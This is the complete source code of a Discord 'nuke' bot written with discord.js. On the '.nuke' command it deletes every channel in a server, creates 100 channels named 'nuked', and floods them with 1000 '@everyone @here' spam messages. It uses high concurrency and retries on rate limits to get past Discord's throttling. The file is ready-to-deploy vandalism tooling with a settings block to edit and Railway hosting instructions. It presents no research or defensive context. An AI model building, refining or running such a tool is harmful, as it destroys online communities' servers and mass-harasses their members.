const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');
const TOKEN = process.env.TOKEN;

if (!TOKEN) {
  console.error("❌ NO TOKEN. Set TOKEN in Railway environment variables.");
  process.exit(1);
}

// ========== CONFIGURATION (edit these) ==========
const PREFIX = ".";
const CHANNEL_NAME = "nuked";                     // fallback if random names disabled
const MESSAGE = "@everyone @here nuked by dnezero";
const AMOUNT_OF_CHANNELS = 100;
const AMOUNT_OF_MESSAGES = 1000;

// Random channel name variations (same as Python version)
const RANDOM_CHANNEL_NAMES = [
  "𝕟𝕦𝕜𝕖𝕕",
  "𝔫𝔲𝔨𝔢𝔡",
  "𝚗𝚞𝚔𝚎𝚍",
  "ɴᴜᴋᴇᴅ",
  "𝓷𝓾𝓴𝓮𝓭",
  "nuked"
];
const USE_RANDOM_NAMES = true;   // set false to always use CHANNEL_NAME

// ========== NO TOUCH BEYOND THIS LINE (unless you know what you're doing) ==========
function getChannelName() {
  if (USE_RANDOM_NAMES && RANDOM_CHANNEL_NAMES.length) {
    return RANDOM_CHANNEL_NAMES[Math.floor(Math.random() * RANDOM_CHANNEL_NAMES.length)];
  }
  return CHANNEL_NAME;
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

// Helper: run tasks with concurrency limit (like asyncio.Semaphore)
async function runConcurrent(tasks, concurrency) {
  const results = [];
  const executing = [];
  for (const task of tasks) {
    const p = Promise.resolve().then(() => task());
    results.push(p);
    if (concurrency <= tasks.length) {
      const e = p.then(() => executing.splice(executing.indexOf(e), 1));
      executing.push(e);
      if (executing.length >= concurrency) {
        await Promise.race(executing);
      }
    }
  }
  return Promise.allSettled(results);
}

// Delete all channels (parallel, concurrency 15)
async function deleteAllChannels(guild) {
  const channels = [...guild.channels.cache.values()];
  console.log(`🗑️ Deleting ${channels.length} channels...`);
  const deleteTasks = channels.map(chan => async () => {
    try {
      await chan.delete();
    } catch (e) {}
  });
  await runConcurrent(deleteTasks, 15);
  console.log("✅ All channels deleted");
}

// Create N channels (parallel, concurrency 10)
async function createChannels(guild, count) {
  console.log(`📝 Creating ${count} channels...`);
  const createTasks = [];
  for (let i = 0; i < count; i++) {
    createTasks.push(async () => {
      try {
        const name = getChannelName();
        const channel = await guild.channels.create({
          name: name,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: guild.roles.everyone.id,
              allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
            },
          ],
        });
        return channel;
      } catch (err) {
        if (err.code === 429) {
          console.log(`⏳ Rate limit on create, waiting ${err.retryAfter}s`);
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
          // retry once
          const name = getChannelName();
          return await guild.channels.create({
            name: name,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              {
                id: guild.roles.everyone.id,
                allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
              },
            ],
          });
        }
        console.log(`❌ Create failed: ${err.message}`);
        return null;
      }
    });
  }
  const results = await runConcurrent(createTasks, 10);
  return results.map(r => r.value).filter(c => c !== null);
}

// Send totalMessages across channels as fast as possible (concurrency 50)
async function sendMessagesFast(channels, totalMessages) {
  if (!channels.length) return;
  console.log(`📨 Sending ${totalMessages} messages across ${channels.length} channels...`);
  const messageTasks = [];
  for (let i = 0; i < totalMessages; i++) {
    const targetChannel = channels[i % channels.length];
    messageTasks.push(async () => {
      try {
        await targetChannel.send(MESSAGE);
      } catch (err) {
        if (err.code === 429) {
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
          await targetChannel.send(MESSAGE);
        }
      }
    });
  }
  await runConcurrent(messageTasks, 50);
  console.log("✅ All messages sent");
}

// Main nuke logic
async function nukeServer(guild) {
  console.log(`🔥 Starting nuke on ${guild.name} (${guild.id})`);
  const startTime = Date.now();

  // 1. Delete all channels
  await deleteAllChannels(guild);

  // 2. Create new channels
  const channels = await createChannels(guild, AMOUNT_OF_CHANNELS);
  if (!channels.length) {
    console.log("❌ No channels created, aborting message spam.");
    return;
  }

  // 3. Send messages
  await sendMessagesFast(channels, AMOUNT_OF_MESSAGES);

  const elapsed = (Date.now() - startTime) / 1000;
  console.log(`💀 Nuke completed in ${elapsed.toFixed(2)} seconds!`);
}

// ========== BOT EVENTS & COMMANDS ==========
client.once('ready', () => {
  console.log(`✅ Bot online as ${client.user.tag}`);
  console.log(`Prefix: ${PREFIX}`);
  console.log(`Command: ${PREFIX}nuke`);
  console.log("=".repeat(50));
  // optional: set status (you can remove if not needed)
  client.user.setPresence({
    status: 'dnd',
    activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }],
  });
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot) return;
  if (!msg.content.startsWith(PREFIX)) return;

  const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'nuke') {
    // Check administrator permission (like Python version)
    if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return msg.reply("❌ You need Administrator permission to use this command!");
    }
    await msg.reply("💣 Nuking server in progress...");
    await nukeServer(msg.guild);
  } else if (command === 'config') {
    const configMsg = `
**Current Configuration:**
📝 Channel Name: \`${CHANNEL_NAME}\`
🎲 Random Names: \`${USE_RANDOM_NAMES ? 'Enabled' : 'Disabled'}\`
💬 Message: \`${MESSAGE.substring(0, 50)}${MESSAGE.length > 50 ? '...' : ''}\`
📊 Channels: \`${AMOUNT_OF_CHANNELS}\`
📨 Messages: \`${AMOUNT_OF_MESSAGES}\`
    `;
    await msg.reply(configMsg);
  }
});

client.login(TOKEN).catch(err => console.error("Login error:", err.message));
